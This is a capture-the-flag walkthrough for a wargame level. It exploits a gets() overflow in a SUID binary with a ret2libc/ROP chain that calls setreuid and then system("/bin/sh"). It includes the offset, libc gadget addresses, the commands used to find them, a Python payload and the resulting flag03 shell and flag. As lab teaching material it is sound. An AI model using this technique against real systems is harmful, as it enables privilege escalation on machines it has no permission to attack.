# Rainfall — Level03 Walkthrough

## 1. Understanding the program

We connect as `level03`. The home directory contains the SUID binary
`armitage` (owned by `flag03`) and its source `armitage.c`.

The program reads one message with `gets(msg)` into a 128-byte buffer.
The goal is to run code as `flag03` and read `/home/flag03/.pass`.

## 2. Protections change the game

Unlike level02, the stack is NOT executable anymore:

```text
GNU_STACK      ... RW   <- NX enabled
```

No stack canary, no PIE, and ASLR is disabled on the VM, so:

- shellcode inside the buffer is dead (jumping into the buffer = SIGSEGV);
- libc is always mapped at the same address: `0x00007ffff7c00000`;
- we control RIP, so we execute EXISTING code: a ROP chain / ret2libc.

The idea: the buffer no longer holds instructions, it holds ADDRESSES of
instructions, in the order we want them executed.

## 3. Finding the offset

In the disassembly of `queue_job`:

```asm
add $0xffffffffffffff80,%rsp     ; sub 0x80
lea -0x80(%rbp),%rax
call gets
```

The buffer is at `rbp-0x80`, so the saved return address is at:

```text
0x80 + 8 = 0x88 = 136 bytes
```

## 4. Picking gadgets and libc addresses

The binary itself has no `pop rdi; ret` (modern gcc no longer emits
`__libc_csu_init`), so the gadgets come from the loaded libc whose base is
fixed. All offsets below are from the libc base:

| Item | Offset | Runtime address |
|---|---|---|
| `pop rdi ; ret` | 0x10c08d | 0x7ffff7d0c08d |
| `pop rsi ; ret` | 0x110b7d | 0x7ffff7d10b7d |
| `setreuid` | 0x127370 | 0x7ffff7d27370 |
| `system` | 0x58750 | 0x7ffff7c58750 |
| `"/bin/sh"` | 0x1cc42f | 0x7ffff7dcc42f |

```bash
nm -D /lib/x86_64-linux-gnu/libc.so.6 | grep -wE "system|setreuid"
ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 | grep -E ": pop rdi ; ret$|: pop rsi ; ret$"
strings -t x /lib/x86_64-linux-gnu/libc.so.6 | grep "/bin/sh$"
ldd ~/armitage            # libc base with ASLR off
```

`gets()` stops at a newline, so no address may contain the byte 0x0a —
all of ours are clean.

## 5. Building the chain

The binary runs with euid = flag03 (1020) but uid = level03 (1004).
`/bin/sh` is dash, which DROPS the effective uid when uid != euid
(the same trap as level02). So the chain first calls
`setreuid(geteuid(), geteuid())` — here simply `setreuid(1020, 1020)`.

```text
[136 padding]
pop rdi ; ret      1020            # ruid = flag03
pop rsi ; ret      1020            # euid = flag03
setreuid                           # uid = euid = flag03
pop rdi ; ret      &"/bin/sh"
system                             # rsp is 16-aligned here (movaps safe)
```

## 6. The exploit

```python
chain = flat(
    POP_RDI, FLAG03_UID,
    POP_RSI, FLAG03_UID,
    SETREUID,
    POP_RDI, BIN_SH,
    SYSTEM,
)
payload = b"A" * 136 + chain + b"\n"
```

Fun detail: `validate_job()` rejects our payload (it does not start with
"JOB:"), but that only makes the program print an error and jump to the
function epilogue — the overwritten return address fires either way.

## 7. Result

```text
uid=1020(flag03) gid=1006(level03) groups=1006(level03),1001(levelgroup)
8c33zqo7hytqnsx9h3nb4juf3rdjbd80
```

The flag is the SSH password for level04.
